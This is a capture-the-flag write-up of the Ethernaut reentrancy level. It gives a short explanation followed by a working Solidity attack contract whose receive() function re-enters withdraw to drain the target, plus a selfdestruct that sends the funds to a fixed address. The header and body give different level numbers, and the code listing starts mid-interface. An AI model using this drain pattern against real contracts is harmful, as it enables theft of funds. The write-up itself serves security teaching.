# Ethernaut Level 11 (Re-entrancy) Walkthrough

The following is a semantic solution walkthrough of the Ethernaut CTF level 10. The aim is to give a readable explanation of the concepts involved, and present a step-by-step walkthrough of the solution. In addition, tangential explanations will also be given where essential.

The lesson here is to guard against Reentrancy attacks. Reentrancy means that given a situation where contract A calls contract B, contract B can call contract A while the transaction containing contract A's call to B is still executing.

#### Solution

The solution is to successfully make a reentrant call. First, create the attack contract and setup a fallback function which calls the withdraw function of the target contract. Then, create an attack function where you deposit and immediately withdraw an amount equivalent to the lowest denomination in the balance of the target contract. In this case it was 0.001 ETH, so the deposit (and withdraw) value should be 0.001 ETH. Consider the code below.

    function balanceOf(address _who) external returns (uint balance);
    function withdraw(uint _amount) external;
    function donate(address _to) external payable;
}

contract EnterAgain {

    address victim = 0x363dD4bDD821005D7033199Eb501a42583aE668A;
    IVictim public  victimInstance;
    
    constructor() {
        victimInstance = IVictim(victim);
    }

    function attack() public payable{
        require(msg.value >= 1000000000000000);
        victimInstance.donate{value: msg.value}(address(this));
        victimInstance.withdraw(1000000000000000);
    }

    function destroy() public {
        selfdestruct(payable(0xecA5bA71FC055AF7FCdFb5755C575B67Ac48EcDF));
    }

    receive() external payable {
         if (address(victim).balance >= 1000000000000000) {
                victimInstance.withdraw(1000000000000000);
         }
                
    }
}
